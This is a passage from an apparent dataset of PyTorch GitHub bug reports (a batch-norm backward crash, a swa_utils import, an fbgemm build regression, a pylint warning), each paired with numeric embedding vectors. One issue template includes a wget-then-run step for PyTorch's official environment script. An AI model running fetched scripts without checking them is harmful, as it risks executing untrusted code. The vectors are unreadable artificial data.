frame #6: <unknown function> + 0x2b6b21b (0x7f996695821b in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #7: at::cudnn_batch_norm_backward(at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, at::Tensor const&, double, at::Tensor const&) + 0x1ef (0x7f9964cff10f in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #8: torch::autograd::generated::CudnnBatchNormBackward::apply(std::vector<at::Tensor, std::allocator<at::Tensor> >&&) + 0x42c (0x7f99668a9fec in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #9: <unknown function> + 0x30d1017 (0x7f9966ebe017 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #10: torch::autograd::Engine::evaluate_function(std::shared_ptr<torch::autograd::GraphTask>&, torch::autograd::Node*, torch::autograd::InputBuffer&, std::shared_ptr<torch::autograd::ReadyQueue> const&) + 0x1400 (0x7f9966eb9860 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #11: torch::autograd::Engine::thread_main(std::shared_ptr<torch::autograd::GraphTask> const&) + 0x451 (0x7f9966eba401 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #12: torch::autograd::Engine::thread_init(int, std::shared_ptr<torch::autograd::ReadyQueue> const&, bool) + 0x89 (0x7f9966eb2579 in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #13: torch::autograd::python::PythonEngine::thread_init(int, std::shared_ptr<torch::autograd::ReadyQueue> const&, bool) + 0x4a (0x7f996b1e199a in /opt/conda/lib/python3.7/site-packages/torch/lib/libtorch_python.so)
frame #14: <unknown function> + 0xc819d (0x7f99aa6fa19d in /opt/conda/bin/../lib/libstdc++.so.6)
frame #15: <unknown function> + 0x76db (0x7f99adb356db in /lib/x86_64-linux-gnu/libpthread.so.0)
frame #16: clone + 0x3f (0x7f99ad85e88f in /lib/x86_64-linux-gnu/libc.so.6)
## To Reproduce

Steps to reproduce the behavior:

1. I used custom lambda layer before batch 
1.
1.

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

<!-- A clear and concise description of what you expected to happen. -->

## Environment
In ubuntu, CUDA 10.1, python 3.7
Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0):
 - OS (e.g., Linux):
 - How you installed PyTorch (`conda`, `pip`, source):
 - Build command you used (if compiling from source):
 - Python version:
 - CUDA/cuDNN version:
 - GPU models and configuration:
 - Any other relevant information:

## Additional context

<!-- Add any other context about the problem here. -->


cc @ngimel @csarofeen @ptrblck @xwang233",True,"[-4.82104778e-01 -7.05285132e-01 -4.40733761e-01 -2.21416771e-01
  3.05491835e-01 -3.76922250e-01  9.21360999e-02  2.14214087e-01
 -5.01202881e-01  4.30023968e-02  3.13202571e-03 -2.84160435e-01
  1.29907966e-01 -2.65293300e-01  4.96055149e-02  8.81839544e-02
 -2.32464761e-01  4.90754377e-03 -2.96574742e-01 -2.07933597e-03
 -3.45127940e-01  2.18720138e-01 -4.48163867e-01 -3.56500335e-02
  6.13903999e-01  2.98602670e-01 -2.73977458e-01 -4.68760729e-01
  3.65501463e-01  1.89208642e-01  4.83098835e-01  1.51593268e-01
 -1.39586672e-01  3.39876235e-01  2.77969480e-01  3.13854665e-02
 -9.30214465e-01 -1.94621056e-01  2.40919918e-01  6.43010288e-02
 -1.28314912e-01 -4.18828785e-01 -1.43373728e-01 -7.91999325e-02
 -2.46136665e-01 -3.26723099e-01 -6.33776188e-01  3.42284620e-01
  1.15341201e-01 -6.71107322e-02  1.95782274e-01 -1.16564356e-01
  5.49825206e-02 -1.91932678e-01  3.93654615e-01  7.00524263e-03
  9.81154107e-03  2.33412653e-01 -1.19985387e-01  2.39456773e-01
  3.78522247e-01 -7.11189508e-02 -1.44518182e-01 -1.05547883e-01
  1.57157779e-01  1.58127546e-01 -5.19312583e-02 -1.51318431e-01
  8.82805109e-01 -3.90427381e-01  4.68237728e-01  5.33429265e-01
 -2.54806399e-01 -2.29641706e-01 -2.61259377e-01  3.43517840e-01
  1.92249864e-01  1.47201508e-01 -1.72335565e-01  1.26016051e-01
 -1.29139304e-01  3.96176279e-01  4.94217798e-02 -6.33344352e-01
  1.89916909e-01  2.73061275e-01  1.86072782e-01  7.08500445e-02
  2.67952174e-01  6.37878925e-02  5.80875516e-01  9.34099630e-02
  1.82835862e-01  5.89594126e-01 -4.58947904e-02  5.05279243e-01
  5.53650379e-01  1.61575258e-01 -3.68630528e-01 -4.44238365e-01
 -7.67391622e-02 -4.41448361e-01 -2.80292094e-01  7.87479103e-01
 -5.98709583e-01 -3.22569668e-01  9.08114240e-02 -2.15827137e-01
  1.62930921e-01  2.56683938e-02  3.79122525e-01 -1.02053523e-01
  2.69654661e-01 -1.59845985e-02  1.34636834e-01  1.49342030e-01
 -4.77957368e-01 -4.13096249e-01 -1.73509404e-01  4.66523133e-02
 -3.10315251e-01  1.08902134e-01  1.04858495e-01 -3.32045078e-01
  3.42042923e-01 -4.16239947e-02  5.26433825e-01  5.59771247e-02
 -1.03117898e-01  8.92046690e-02  3.99489775e-02 -6.19586557e-04
  9.93691981e-02 -8.81434456e-02 -3.14992487e-01  4.30912435e-01
 -3.23202848e-01 -2.46839568e-01 -2.20127121e-01 -2.22690701e-01
 -4.60905492e-01  8.16008896e-02  2.08730668e-01 -3.65963966e-01
  3.03098798e-01 -1.69810653e-01 -1.59832254e-01  8.77233893e-02
 -9.45522785e-02  3.73571694e-01 -1.23407200e-01  1.64764985e-01
 -7.51735091e-01  7.23223209e-01  5.27744591e-02  1.90272868e-01
  5.17585635e-01  3.27238798e-01  3.20363790e-01 -9.72510874e-01
  2.40158319e-01  6.75827265e-01  3.18065614e-01  5.06079867e-02
  1.40137970e-01  1.04143634e-01 -4.18765664e-01 -9.15573239e-02
 -2.33457267e-01  2.72843361e-01 -4.08891410e-01 -3.80838066e-02
  3.07119340e-01 -4.77882951e-01 -7.78064132e-02 -2.08235368e-01
 -3.28717172e-01 -2.82266140e-01  2.98919261e-01  6.34785771e-01
 -9.62531492e-02  5.69407821e-01  4.93380189e-01  1.87192604e-01
  6.11250162e-01  5.73300958e-01  3.43796492e-01  1.72622889e-01
 -2.76031494e-01 -4.94498700e-01 -4.37682122e-01 -2.34524801e-01
  1.50416732e-01 -2.28075869e-02 -1.47583082e-01  4.63853739e-02
  7.16849446e-01  5.81158280e-01  2.52858102e-01  1.64636672e-01
 -2.00232789e-01  1.74646825e-01  3.81662905e-01  2.84412891e-01
 -7.85360783e-02 -2.97505222e-02 -9.41299796e-02 -5.38070798e-01
  5.10721684e-01  9.54035372e-02 -7.89406657e-01 -6.44243598e-01
 -1.34431988e-01 -3.03922951e-01 -2.03120992e-01  4.28573012e-01
  5.42688109e-02 -1.12324178e-01 -2.04144031e-01  7.21936002e-02
  6.35067403e-01 -8.24892446e-02  8.11760277e-02 -9.46671069e-01
  1.12553507e-01 -9.35069248e-02  1.46249622e-01 -4.11631227e-01
  1.76189885e-01 -2.06802100e-01 -2.23525465e-01  8.66839066e-02
 -4.58596230e-01 -2.55763084e-02  6.81660771e-02  3.40712667e-01
  1.72199115e-01 -1.66669533e-01 -2.18759794e-02  3.19438785e-01
 -8.85138661e-02 -7.55487159e-02 -2.50802457e-01  1.12555429e-01
  3.94400299e-01  3.70279491e-01 -2.63237238e-01  2.00468879e-02
 -7.27093637e-01  2.36101374e-01  2.65087068e-01 -3.21898878e-01
  2.27790445e-01 -4.31324303e-01  3.83603573e-01  1.51916994e-02
  3.74827027e-01  2.92096287e-01 -1.14158336e-02  6.23561665e-02
  6.26652122e-01  5.94888687e-01 -3.23719025e-01  4.01769988e-02
 -1.09449469e-01  5.62079623e-02 -5.74225247e-01  4.22451437e-01
 -2.33063012e-01  1.11844122e-01  2.35547185e-01  1.40361100e-01
  3.75518590e-01 -1.11462131e-01  3.93694878e-01 -9.44220573e-02
  7.00514436e-01 -1.24824122e-01  3.14279437e-01 -1.07831825e-02
  3.01641881e-01 -7.38673806e-02  2.44916201e-01  2.45575115e-01
  4.76394147e-01 -1.01394802e-01 -5.63323975e-01 -3.14535081e-01
 -2.30266869e-01 -3.06286693e-01 -2.50294954e-01  1.18810982e-01
  1.83237374e-01 -6.34236336e-01 -2.58263350e-01  2.38929451e-01
  3.82789731e-01  1.29161894e-01 -5.92485368e-02 -3.56609166e-01
 -8.82659793e-01 -5.70531070e-01  1.83004111e-01 -7.58866191e-01
 -2.62230933e-01 -3.22393477e-01  3.32850426e-01  3.52978647e-01
  3.22168171e-01 -4.71689433e-01  2.73960322e-01 -3.43998283e-01
 -2.53519237e-01  1.00825690e-01 -1.61253773e-02 -2.25592658e-01
  2.89300859e-01  3.33135128e-01  5.76660216e-01 -5.20631790e-01
 -1.68291509e-01 -8.79660845e-01 -2.43884385e-01 -1.56471312e-01
  7.73600101e-01  2.49877609e-02 -7.44908750e-01  4.74000484e-01
  3.74646455e-01  4.08146948e-01  2.08144277e-01  4.27954793e-01
 -5.52684441e-02  2.64029771e-01 -2.10997030e-01  1.82677925e-01
  5.42106181e-02 -1.19319752e-01  3.45208257e-01 -8.79153371e-01
  1.40116870e-01  2.23526582e-02 -3.69243324e-03 -4.12316144e-01
 -2.62417793e-01  1.13706149e-01  1.97374701e-01  8.65235627e-01
  1.08949840e-01 -3.86632234e-03 -2.56270051e-01  7.41723627e-02
  2.91815251e-01 -5.02485871e-01 -5.04598260e-01  6.23406768e-01
  7.02681065e-01  3.99631634e-02  4.21213150e-01 -1.06304713e-01
  2.25662574e-01  2.45290875e-01 -1.34358913e-01 -2.03150243e-01
  1.37821704e-01 -3.31953973e-01 -2.90503144e-01  1.99577302e-01
  3.12311232e-01 -2.94755816e-01 -5.64863026e-01 -8.83089602e-02
  2.20232643e-02  1.77528381e-01  5.79599559e-01  7.99800456e-03
 -2.51498640e-01 -2.24921525e-01  5.03679156e-01  1.87619835e-01
  3.33929062e-01  1.75855443e-01  2.16467381e-01 -2.41033852e-01]"
Cannot Import SWA Utils module: optimizer triaged,"## ðŸ› Bug

Unable to import `swa_utils`.

PyTorch: - Version 1.6
OS: - Windows and Linux
Tested on CUDA as well as CPU only installation

This import failed on all.

### To reproduce

Simply run

```
swa_scheduler = torch.optim.swa_utils.SWALR(
                optimizer, anneal_strategy=""linear"", anneal_epochs=20, swa_lr=0.05
            )
           AttributeError: module 'torch.optim' has no attribute 'swa_utils'
AttributeError: module 'torch.optim' has no attribute 'swa_utils'
```

### Possible Fix

The problem may be in the init file [here](https://github.com/pytorch/pytorch/blob/master/torch/optim/__init__.py)
`swa_utils` is not imported. 

Adding line from `.swa_utils import AveragedModel, SWALR` will allow it to import 

### Current Alternatives

I am able to do 
```
from torch.optim.swa_utils import SWALR
```

Then I can use SWALR properly.

It would nice If I could use the swa_utils itself to import SWALR. I'm Not sure if this is a bug or this is the way it was designed.

This feature works now. But it would be nice if it would be in `optim` or I can import `swa_utils` as well.


cc @vincentqb",True,"[-2.60266185e-01 -3.51047993e-01 -4.03523594e-01  8.74540657e-02
 -8.59220140e-03 -2.46883720e-01 -1.97030932e-01  5.37818596e-02
 -3.68802309e-01 -2.48099715e-01 -2.10357890e-01 -1.83229014e-01
  1.70785576e-01 -2.30034292e-02 -9.52339545e-02  1.00517422e-01
 -1.59871697e-01 -2.22207412e-01  1.14596725e-01 -2.04209328e-01
  7.38739222e-02 -3.44381705e-02 -1.97290570e-01 -2.35851988e-01
  3.01462449e-02  1.49069771e-01  8.78901929e-02 -1.32652938e-01
  3.05754662e-01  9.51059461e-02  1.47351831e-01  7.74659589e-02
 -2.01986119e-01  1.47763640e-04  2.79904336e-01  1.89539231e-02
 -1.10595472e-01 -5.39322734e-01 -1.11347876e-01 -2.97040582e-01
 -2.31027324e-02  1.64694190e-01 -1.35930598e-01  1.99341327e-02
 -2.90970594e-01 -2.09269732e-01  1.73896998e-01  2.21790165e-01
 -5.20730138e-01  2.28453144e-01 -2.37718061e-01 -5.26445210e-02
 -2.30260357e-01 -7.42046714e-01  1.49669364e-01  3.06253321e-03
 -5.73420376e-02  1.84278458e-01 -8.28165933e-03 -4.40726876e-02
  1.96855292e-02 -2.73858547e-01  1.40010923e-01  1.92696266e-02
  1.11471936e-01 -1.46581605e-01 -7.26053119e-02 -9.07280669e-02
  3.02756727e-01 -2.38152612e-02 -2.60838836e-01 -1.80702999e-01
 -1.63694993e-02 -9.81680378e-02  1.18240833e-01  7.16344118e-02
 -2.87786089e-02  2.18103945e-01 -1.51538968e-01 -5.59153445e-02
 -6.09632581e-04  2.81671762e-01  8.22671875e-02 -1.20152488e-01
  2.53372848e-01 -1.61752969e-01  1.14580721e-01 -1.36728108e-01
  2.57085025e-01  1.11163020e-01  6.27299905e-01 -2.05720976e-01
  1.25847071e-01  3.34703833e-01  5.01212403e-02  2.75121778e-01
  2.10112929e-02  8.59776288e-02 -7.69613609e-02 -2.93602705e-01
 -1.14909410e-01 -2.38598645e-01  1.03289951e-02  5.04796386e-01
 -3.09705853e-01 -1.44962251e-01 -1.83504727e-02  3.53841335e-01
  1.59695148e-02 -1.63905412e-01  3.00242335e-01  4.05126624e-02
 -1.68989561e-02  3.85344215e-02 -1.79767221e-01  1.41355067e-01
 -3.99772167e-01 -1.14537433e-01  5.49810193e-03  9.80960801e-02
 -6.73220158e-02 -7.96209574e-02  2.67151177e-01 -1.41755596e-01
  9.86267254e-02  1.27762184e-01 -1.33653417e-01 -1.55552685e-01
 -8.03513229e-02  4.24984209e-02  1.01604648e-02 -1.83474392e-01
  9.55925658e-02 -1.04717627e-01  3.14627677e-01  2.33885750e-01
 -4.76281554e-01 -1.47801608e-01 -1.06243968e-01 -3.33008654e-02
 -2.32179016e-01 -3.91400307e-02  2.93034792e-01 -1.47614509e-01
 -3.20853740e-02  9.54942405e-03 -8.85204673e-02  2.65098482e-01
  2.71666378e-01 -1.37288734e-01  2.28519246e-01 -7.16076940e-02
 -5.93548715e-01  3.48096907e-01  1.14859536e-01  1.86439976e-01
  3.10149223e-01 -2.82578021e-02  4.82993275e-02 -2.63224602e-01
  1.58600137e-02  3.22558552e-01  6.64125234e-02 -1.18418887e-01
 -6.49200231e-02  1.19771287e-01 -2.52832055e-01  3.27963471e-01
 -5.99509254e-02  1.25461131e-01  1.27769679e-01  1.83831096e-01
  2.45864749e-01 -3.44835877e-01  3.73890281e-01  1.31695107e-01
  9.00813490e-02 -1.69431344e-02 -3.67758334e-01  4.47438389e-01
  3.04020226e-01  3.67349863e-01  3.09527189e-01 -2.18128823e-02
  2.56380796e-01  1.24775842e-01  3.39630812e-01  9.68132615e-02
 -4.34661984e-01 -7.01410025e-02  8.78978372e-02 -1.05195120e-01
  4.62755337e-02 -4.15955745e-02 -7.14728534e-02  2.95294672e-02
  9.14482772e-02  8.43690634e-02  1.80957690e-01  1.10231012e-01
 -1.03017420e-01  1.86875001e-01  1.80848449e-01  8.50059185e-03
  4.12139744e-01  1.33533269e-01 -4.96078245e-02 -3.03400099e-01
 -1.37463003e-01  3.36711645e-01 -2.19863087e-01 -3.46918315e-01
  1.63573295e-01 -3.10647022e-03 -2.41509780e-01  1.57583728e-01
  7.53272772e-02 -4.60658781e-02  1.33193001e-01  1.77453548e-01
  1.16961211e-01 -1.73232019e-01 -8.13989267e-02 -1.48167431e-01
  3.19809347e-01  1.70943797e-01 -4.24866155e-02  4.36439067e-02
 -9.16247964e-02 -8.65515321e-02 -1.01625629e-01 -2.32578367e-01
  1.34518966e-01 -1.70941502e-01 -8.20597485e-02  2.19998211e-01
  3.08747053e-01 -2.54453540e-01  9.86669734e-02 -1.14843305e-02
 -1.60658613e-01 -1.30365312e-01  7.17453063e-02 -3.21825147e-01
  1.17040485e-01  5.18572479e-02  8.72521996e-02 -2.58698255e-01
 -1.90561458e-01 -2.32143581e-01  5.35716601e-02 -1.10255077e-01
 -1.52940482e-01  1.68383449e-01  2.90787995e-01  1.42255366e-01
  3.66605967e-02 -5.34457043e-02  9.10752267e-03  1.32172018e-01
  3.10766339e-01  4.32356954e-01 -1.32535383e-01  3.57375830e-01
  2.26883322e-01  2.00967193e-01 -3.19003284e-01 -3.04632727e-03
 -2.34670863e-02  6.82004616e-02 -7.94121921e-02 -3.68565887e-01
  2.14883327e-01  1.82590708e-02  2.84829319e-01 -8.23574960e-02
  3.63498300e-01 -3.83909404e-01 -7.98058324e-03 -2.72539884e-01
  2.65860856e-01  8.62922817e-02 -1.80976093e-01 -8.28052461e-02
  3.19081604e-01 -1.24241725e-01 -2.11813405e-01 -3.56352717e-01
 -1.39360666e-01  4.76701334e-02  1.05990693e-01  1.20124772e-01
  8.71645957e-02 -2.75357720e-03 -4.51576263e-01 -5.12844808e-02
  3.82959284e-03 -5.04497476e-02  3.02339206e-03 -1.76086292e-01
 -2.80746460e-01  2.67306447e-01  2.78348386e-01 -1.34105116e-01
 -1.58742785e-01  1.89139336e-01  8.72459710e-02  1.92106351e-01
  4.82643515e-01 -3.38988245e-01 -4.72778752e-02  2.76314050e-01
  5.68124652e-02  2.72930801e-01 -6.48888946e-02  3.95645574e-02
  8.64212885e-02  5.23328364e-01  2.46226043e-01  9.59049985e-02
 -3.10420096e-01 -3.25225472e-01 -4.52583760e-01  1.68127239e-01
  3.35408688e-01  1.31289721e-01 -5.80246329e-01 -2.14943103e-02
 -6.90129586e-03  2.29295120e-01  2.83148997e-02  2.08973080e-01
 -4.47192602e-03  3.56808782e-01 -2.80422866e-01  1.57151178e-01
  9.79544222e-02  2.37687334e-01  1.57291256e-03 -3.55885804e-01
  4.90247011e-02 -4.35038917e-02  1.79738268e-01 -1.77181065e-01
 -1.81199923e-01 -4.28201817e-03  1.58947967e-02  1.34773910e-01
 -1.09426163e-01 -2.47004479e-02 -2.31066644e-01 -7.23366514e-02
 -7.56479353e-02 -1.24091923e-01 -2.46893376e-01 -7.53525496e-02
  2.74674147e-01  2.69759566e-01 -1.11214798e-02  3.02412629e-01
 -1.98441133e-01  2.03988478e-01 -1.78831339e-01 -1.39494747e-01
 -2.60225870e-03 -8.17468166e-02 -4.10602570e-01 -6.23967946e-02
 -1.37604117e-01  1.03872374e-01 -1.77253023e-01  2.05962375e-01
 -2.93657720e-01  2.26648510e-01  1.56764016e-01 -2.12403797e-02
 -5.89910150e-02 -3.31149623e-02  2.09730983e-01  1.89467251e-01
  7.42892772e-02  5.77431656e-02  1.39922455e-01 -2.05747634e-01]"
Undefined reference to fbgemm. high priority module: build triaged,"## ðŸ› Bug

This is a build regression within last few days.
We got undefined reference `void fbgemm::CodeGenBase<unsigned char, signed char, int, int>::storeCRegs<asmjit::x86::Zmm, 64>(asmjit::x86::Emitter*, int, int, asmjit::x86::Gp, asmjit::x86::Gp, bool)`

<img width=""1064"" alt=""image"" src=""https://user-images.githubusercontent.com/5203025/89109182-7a82b200-d471-11ea-90e8-66d0adb25120.png"">

Since there's an fbgemm update 2 days ago, that could be the reason.
https://github.com/pytorch/pytorch/pull/42302

## Environment

 - PyTorch Version (e.g., 1.0): master
 - OS (e.g., Linux): Ubuntu 18.04
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): cmake+ninja+gcc-8
 - CUDA/cuDNN version: 11/8


cc @ezyang @gchanan @zou3519 @malfet",True,"[-2.78733909e-01 -2.34646708e-01 -3.87753963e-01 -2.11249977e-01
 -2.97212228e-03 -3.24754685e-01 -1.28446460e-01  1.10117801e-01
 -1.48504913e-01 -3.73712122e-01  3.46476305e-03 -2.96034902e-01
  1.57544822e-01  4.28752527e-02 -6.13249652e-02  1.82246752e-02
  1.39211431e-01 -1.55424058e-01  2.64945477e-01  2.04971910e-01
 -1.37520909e-01  2.48215422e-01  7.92834908e-02  1.59950182e-01
  2.45326594e-01 -2.12139502e-01 -3.97669747e-02  3.53364795e-02
 -1.45858228e-01 -2.36494213e-01  3.06072623e-01  1.94391683e-01
  3.18254419e-02  8.20820034e-02  3.36362958e-01  2.16424793e-01
 -9.61729437e-02 -3.28504473e-01 -1.07528441e-01  1.14187263e-02
 -8.10803194e-03  1.30788758e-01  1.19076729e-01 -1.01409212e-01
 -7.54328668e-02 -2.33680420e-02 -2.07894981e-01  4.02894109e-01
 -1.56994671e-01  3.51972207e-02 -8.35853517e-02 -1.45529106e-01
 -3.24531406e-01 -2.21270502e-01  3.47906426e-02  2.83561170e-01
 -1.97978854e-01 -2.13013858e-01  4.81082425e-02  1.82678953e-01
  1.86266422e-01  1.36418104e-01  2.98938632e-01  9.57423449e-03
  9.83004346e-02  1.35148659e-01  7.78620392e-02 -1.97797298e-01
  5.79375744e-01 -3.19121480e-01 -2.19069153e-01  5.94465211e-02
 -2.57679045e-01 -1.97201669e-01  2.13209629e-01  1.14705339e-01
 -1.33413300e-01  3.06061774e-01  8.19868594e-02 -1.58525765e-01
 -1.82267010e-01 -2.26028174e-01 -6.61842152e-02 -1.33636430e-01
  1.64450586e-01 -1.04173258e-01  1.32012427e-01 -4.89039868e-02
 -6.12273254e-02  1.74719065e-01  4.79402184e-01 -2.18121454e-01
 -2.50352740e-01  2.19224066e-01  2.80033827e-01  4.97462451e-02
 -7.82630295e-02  1.04779117e-01  5.71342744e-02 -1.37541160e-01
 -3.11679602e-01 -2.53474832e-01  2.54226148e-01  1.01794094e-01
 -2.50109732e-01 -2.49167621e-01 -3.31548452e-02  2.59661287e-01
  1.87038884e-01 -1.42776549e-01 -1.38891131e-01 -3.45799513e-02
  6.95448741e-02 -4.41502243e-01 -2.00919092e-01  2.14212030e-01
  2.06727013e-02 -3.89982104e-01 -1.61256105e-01 -2.34935023e-02
 -2.83426225e-01  5.51890843e-02  5.41681126e-02 -4.28541824e-02
  2.01291293e-02  1.16933554e-01 -5.52006721e-01 -1.79233551e-02
  8.57485086e-02 -1.67789087e-02  2.88773090e-01  3.30353566e-02
 -1.30483478e-01 -1.22767486e-01  9.54869390e-02  4.26214337e-02
 -5.03341317e-01 -3.73950958e-01  6.84418529e-02 -2.14614168e-01
  1.22049682e-01 -9.58911330e-02  1.43278822e-01  5.38045689e-02
 -3.04214180e-01  4.56622362e-01 -8.76393467e-02  1.85898200e-01
 -2.09757745e-01 -1.02758110e-01 -3.11997831e-02  1.20467627e-02
  1.81878116e-02  5.08780956e-01  7.91086070e-03  2.11912662e-01
  4.28122401e-01 -1.40584022e-01  1.92488506e-01 -1.93745583e-01
 -1.68682352e-01  3.48804533e-01  3.65422189e-01  1.03281997e-02
  2.26771623e-01  1.31581947e-02 -1.52625650e-01 -6.48253635e-02
  6.08039536e-02  1.63528562e-01  1.60696387e-01 -9.06894356e-02
  2.39222825e-01 -2.70788938e-01  2.90971458e-01 -8.97283703e-02
  4.46226120e-01 -6.92334473e-02  4.51390538e-03  2.35883906e-01
  2.26606339e-01  1.96442649e-01 -1.56881493e-02  2.72878230e-01
  7.87905604e-02  9.47147682e-02  3.45102362e-02 -1.28512427e-01
  2.40525454e-02  6.65258616e-02 -2.69820988e-01  1.59019232e-01
  1.66043267e-01 -5.47948815e-02 -1.82626456e-01 -1.75249249e-01
  3.91315818e-01  3.85581613e-01  4.81064171e-01  9.01284292e-02
  2.87033856e-01  2.69069016e-01  2.37393707e-01  2.00362742e-01
 -1.90049052e-01 -1.25615895e-01  7.42525458e-02 -1.83395058e-01
  2.46048719e-01  2.28047609e-01 -3.09486091e-01 -1.09511033e-01
 -2.66457766e-01 -3.38736661e-02 -2.78461576e-01 -3.97959724e-04
 -2.05982283e-01 -1.09155387e-01  7.63199180e-02  5.23822308e-02
 -9.66625661e-02  7.53849819e-02 -1.47059083e-01 -2.20724925e-01
  4.76373553e-01  8.16364437e-02  4.19417471e-02 -6.56590462e-02
  2.99686819e-01 -7.39120394e-02 -4.77301925e-02 -1.80192053e-01
  1.13375664e-01  9.81776863e-02 -7.14258552e-02  1.83652788e-01
 -2.06356481e-01 -1.83451653e-01 -7.96152055e-02 -1.78741634e-01
  8.24947730e-02 -3.69944304e-01 -2.03771174e-01 -8.61951709e-03
  2.81852305e-01 -7.54058212e-02  2.69116759e-01 -1.54776843e-02
 -2.50221848e-01  8.57416838e-02 -5.10153845e-02  1.01211771e-01
  2.67687947e-01 -1.02928117e-01 -9.65153873e-02  2.97037184e-01
 -8.98985863e-02  1.33099845e-02  2.96760798e-02 -1.27087966e-01
  1.02681249e-01  4.34808522e-01  1.05063960e-01 -2.00457200e-02
  1.56477123e-01  3.30510676e-01 -2.76945114e-01 -1.84488416e-01
  6.63590506e-02 -1.10792100e-01  4.56215590e-01  1.35936718e-02
  4.42184448e-01 -1.25951022e-01  2.00915873e-01  2.39132028e-02
  3.86565983e-01 -1.54052928e-01  6.64048642e-02  2.66313016e-01
 -8.59359875e-02  8.69322121e-02  5.42299390e-01  1.20099284e-01
  3.07807446e-01 -1.78205162e-01 -1.29927676e-02 -1.78132206e-01
 -3.82663220e-01 -2.50162650e-02 -4.07309420e-02 -1.13977067e-01
 -1.55228868e-01 -8.20807219e-02 -1.75491422e-01  3.68420184e-02
 -5.40186092e-03  7.16511905e-02  1.50918260e-01 -4.56105247e-02
 -3.13753188e-02 -3.65679890e-01  2.76151210e-01 -1.31926700e-01
 -1.91504329e-01 -4.85261381e-02 -1.22015476e-01  3.94568026e-01
  4.20360059e-01 -4.88843322e-01  2.25537181e-01  1.83549881e-01
 -2.69912601e-01  1.99216008e-01 -4.15104330e-01  2.11607456e-01
 -6.94869161e-02  2.22709507e-01 -1.83417261e-01  7.70296380e-02
 -6.90188110e-02 -1.14174269e-01 -4.13978994e-01  5.13987541e-02
  1.10828899e-01  3.79768193e-01 -2.82527745e-01 -2.00564384e-01
  1.40199885e-01  2.70221084e-01 -6.53923005e-02  7.50594363e-02
  3.12365796e-02  6.92508668e-02 -3.07992816e-01 -2.74650693e-01
 -4.80564952e-01 -3.66008580e-02  9.73659605e-02 -2.91538268e-01
 -4.43101302e-02 -2.13301972e-01  8.03684816e-04 -5.71439713e-02
 -1.23572022e-01 -2.56479919e-01  3.38329859e-02  5.83814919e-01
  3.08821499e-02  4.59175557e-02 -6.99537713e-03  3.03378433e-01
 -5.26622422e-02 -1.12030350e-01 -3.89831811e-01  1.39113683e-02
  1.77388385e-01  1.78585589e-01  2.58902341e-01  3.31962168e-01
 -1.54744983e-01 -2.36953363e-01 -2.65640914e-01 -1.69198707e-01
 -5.59436418e-02 -1.97591141e-01 -3.13650608e-01  1.80601329e-02
  2.69082673e-02  1.44897670e-01 -3.85602415e-02 -5.81794605e-02
 -3.66590917e-01  9.57222097e-03  1.14752576e-01 -6.19667508e-02
 -6.95192814e-02 -1.70318574e-01  5.33973217e-01 -1.09026313e-01
  8.00214708e-02 -2.95079321e-01  4.00594622e-03  7.53302574e-02]"
Upgrading to 1.6 produces pylint `abstract-method` warning for custom modules module: typing triaged,"## ðŸ› Bug

The following trick for mypy

https://github.com/pytorch/pytorch/blob/269ec767cabe9c47baab18e58fad5d6485d4e65d/torch/nn/modules/module.py#L223-L239

introduced with 1.6 leads to pylint warnings

```
W0223: Method '_forward_unimplemented' is abstract in class 'Module' but is not overridden (abstract-method)
```

when extending `nn.Module` for custom modules.

## To Reproduce

Steps to reproduce the behavior:

1. Create MWE
```python
from torch import nn

class MyModule(nn.Module):
    def forward(self, x):
        return x
```
2. run pylint
```console
$ pylint --disable=all --enable=abstract-method mwe.py
mwe.py:4:0: W0223: Method '_forward_unimplemented' is abstract in class 'Module' but is not overridden (abstract-method)

```

## Expected behavior

No warnings if `forward` is implemented.

## Environment

```
Collecting environment information...
PyTorch version: 1.6.0
Is debug build: No
CUDA used to build PyTorch: 10.2

OS: Ubuntu 20.04.1 LTS
GCC version: (Ubuntu 9.3.0-10ubuntu2) 9.3.0
CMake version: Could not collect

Python version: 3.8
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] torch==1.6.0
[conda] Could not collect
```

## Additional context

* I am using pytorch in project with many custom modules where the CI runs pylint. Since upgrading to torch 1.6 I therefore get a large number of warning. Since pylint is quite widespread, I suppose this problem may occur for other users as well.
* I am unsure whether the ""bug"" type of issue is correct. However, it seemed to be the best fit.

cc @ezyang @malfet @rgommers",True,"[-5.94793782e-02 -2.77681589e-01 -3.99198413e-01  8.79043341e-02
  4.48265731e-01 -2.84328133e-01  2.02551454e-01 -3.14338990e-02
 -3.87204021e-01 -3.61427009e-01  1.80605173e-01  1.62702173e-01
 -2.28051901e-01  1.07176073e-01  1.05868511e-01  7.17043132e-02
  2.04078913e-01 -4.28376555e-01 -1.99113309e-01 -2.67647773e-01
  8.92913938e-02  2.57289469e-01  1.57876629e-02  1.94204867e-01
 -2.62009233e-01 -5.22697121e-02 -2.08960958e-02 -2.44110465e-01
 -9.09405351e-02  2.80229330e-01  4.47662205e-01  2.85169244e-01
 -2.74638891e-01 -8.08308125e-02  2.56637603e-01 -3.08761187e-02
 -2.25708246e-01 -1.22770153e-01  2.10073680e-01  3.71639505e-02
 -3.29179615e-02  2.24190965e-01 -3.69472563e-01 -8.52171406e-02
 -1.35230199e-01 -2.93851078e-01 -4.99688126e-02  4.22044337e-01
 -1.50506124e-01  1.85229834e-02  1.26928613e-01 -2.89788842e-01
 -1.40402615e-01 -4.92386013e-01  1.36961624e-01 -1.49199575e-01
